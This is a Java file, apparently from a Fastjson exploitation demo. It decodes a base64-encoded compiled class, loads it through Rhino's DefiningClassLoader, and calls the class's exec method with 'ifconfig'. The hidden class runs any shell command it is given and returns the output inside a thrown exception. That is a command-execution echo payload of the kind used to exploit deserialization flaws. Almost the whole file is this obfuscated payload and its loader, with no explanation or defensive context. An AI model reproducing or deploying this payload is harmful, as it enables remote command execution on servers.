package FastJsonDemo;

import org.mozilla.javascript.DefiningClassLoader;
import sun.misc.BASE64Decoder;

import java.lang.reflect.Method;

public class Base64Exec {
    public static void main(String []args) throws Exception{
        String R = "yv66vgAAADQASQoAFAAjCAAkBwAlCgAmACcKACYAKAoAKQAqCgADACsKAAMALAcALQoACQAjCgAJ\n" +
                "AC4HAC8KAAwAMAoACQAxCgADADIHADMIADQKABAANQcANgcANwEABjxpbml0PgEAAygpVgEABENv\n" +
                "ZGUBAA9MaW5lTnVtYmVyVGFibGUBAARleGVjAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQANU3Rh\n" +
                "Y2tNYXBUYWJsZQcANgcALwcAOAcAJQEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAGUi5qYXZh\n" +
                "DAAVABYBAAABABtqYXZhL2lvL0J1ZmZlcmVkSW5wdXRTdHJlYW0HADkMADoAOwwAGQA8BwA9DAA+\n" +
                "AD8MABUAQAwAQQBCAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAEMARAEAEGphdmEvbGFuZy9T\n" +
                "dHJpbmcMABUARQwARgBHDABIABYBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADXl5eDAAVABoBAAFS\n" +
                "AQAQamF2YS9sYW5nL09iamVjdAEAAltCAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1l\n" +
                "AQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5n\n" +
                "L1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEv\n" +
                "aW8vSW5wdXRTdHJlYW07AQAZKExqYXZhL2lvL0lucHV0U3RyZWFtO0kpVgEABHJlYWQBAAcoW0JJ\n" +
                "SSlJAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxk\n" +
                "ZXI7AQAHKFtCSUkpVgEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAVjbG9zZQAh\n" +
                "ABMAFAAAAAAAAgABABUAFgABABcAAAAdAAEAAQAAAAUqtwABsQAAAAEAGAAAAAYAAQAAAAMAAQAZ\n" +
                "ABoAAgAXAAAA5AAGAAcAAAB4EgJNERAANgQVBLwIOgW7AANZuAAEK7YABbYABhUEtwAHOgYZBhkF\n" +
                "AxUEtgAIWT4CnwAjuwAJWbcACiy2AAu7AAxZGQUDHbcADbYAC7YADk2n/9MZBrYAD7sAEFm7AAlZ\n" +
                "twAKEhG2AAsstgALEhG2AAu2AA63ABK/AAAAAgAYAAAAIgAIAAAABQADAAcACAAIAA4ACQAjAAsA\n" +
                "MwAMAFMADgBYAA8AGwAAADIAAv8AIwAHBwAcBwAdBwAdAAEHAB4HAB8AAP8ALwAHBwAcBwAdBwAd\n" +
                "AQEHAB4HAB8AAAAgAAAABAABABAAAQAhAAAAAgAi";
        System.out.print(R);
        BASE64Decoder decoder = new BASE64Decoder();
        byte [] bt = decoder.decodeBuffer(R);

        DefiningClassLoader cls = new DefiningClassLoader();
        Class cl = cls.defineClass("FastJsonDemo.R",bt);
        Method m = cl.getMethod("exec",String.class);
        ((Method) m).invoke(cl.newInstance(),"ifconfig");



    }
}
